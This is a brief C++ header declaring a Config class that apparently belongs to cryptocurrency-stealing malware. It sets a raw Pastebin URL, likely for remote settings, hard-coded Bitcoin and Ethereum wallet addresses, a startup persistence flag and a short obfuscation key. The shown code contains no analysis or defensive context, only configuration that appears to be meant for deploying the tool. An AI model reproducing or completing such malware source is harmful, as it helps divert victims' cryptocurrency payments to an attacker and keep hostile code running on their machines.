#pragma once
#include <fstream>
class Config
{
public:
	std::string pastebinUrl = "http://pastebin.com/raw/Yd76WVbu";
	std::string BitcoinAddress = "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN3";
	std::string EthereumAddress = "0x176B24B4c871Df6e0fE4E0c735Db075064b47Bc4";
	bool startup = true;
	char key[3] = { 'K', 'C', 'Q' }; //Any chars will work
};

